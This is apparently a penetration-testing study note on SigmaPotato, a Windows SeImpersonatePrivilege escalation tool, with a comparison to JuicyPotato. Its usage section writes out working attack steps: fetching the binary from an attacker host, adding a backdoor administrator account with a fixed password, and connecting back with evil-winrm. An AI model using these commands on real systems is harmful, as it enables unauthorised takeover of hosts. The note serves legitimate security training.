# SigmaPotato

**What it is:** modern SeImpersonatePrivilege escalation tool. Speeds up the [[17. Windows Privilege Escalation#3. Abusing Windows Privileges (SeImpersonatePrivilege)|17.3.2 Potato attack]] over doing it manually.

**What it replaces:** JuicyPotato. JuicyPotato required you to supply a valid CLSID (a specific COM object GUID that varies by Windows version/build), find the right one from a compatibility list, and retry if it failed. SigmaPotato has no CLSID requirement -- it uses a different COM coercion path that works consistently across Windows 10, 11, Server 2019, and Server 2022.

**What it does NOT replace:** the manual understanding of why SeImpersonatePrivilege matters, how named pipe impersonation works at the kernel level, and when Potato attacks apply (see [[17. Windows Privilege Escalation#3. Abusing Windows Privileges (SeImpersonatePrivilege)|the module's architecture diagram and named pipe explanation]]). SigmaPotato is the deployment shortcut once that's understood.

---

## When to reach for it

- `whoami /priv` shows `SeImpersonatePrivilege` as Enabled
- Common contexts: web shell on IIS, any service running as NETWORK SERVICE or LOCAL SERVICE, sometimes after a token-stealing step
- The service/context you're in does NOT already run as SYSTEM (if it does, SigmaPotato is unnecessary)

## Basic usage

```powershell
# Deliver to target
iwr -uri http://<kali-ip>/SigmaPotato.exe -OutFile SigmaPotato.exe

# Run command as SYSTEM
.\SigmaPotato.exe "whoami"
.\SigmaPotato.exe "net user hacker Passw0rd! /add"
.\SigmaPotato.exe "net localgroup Administrators hacker /add"

# Verify user was created
net user hacker
```

Then connect back with admin privileges:
```bash
evil-winrm -i <target-ip> -u hacker -p Passw0rd!
```

## vs JuicyPotato

| | SigmaPotato | JuicyPotato |
|--|--|--|
| CLSID required | No | Yes (OS-version specific) |
| Windows 10/11 | Yes | Partially (some builds patched) |
| Server 2019/2022 | Yes | Often broken |
| Still works | Yes | Depends on patch level |

## Source / download

- GitHub: [github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- Releases page has pre-compiled EXE

**Modules:** [[17. Windows Privilege Escalation#3. Abusing Windows Privileges (SeImpersonatePrivilege)|17.3.2 Using Exploits]]

#### Tags: #ModernTooling #SigmaPotato #SeImpersonatePrivilege #WindowsPrivesc #Module17
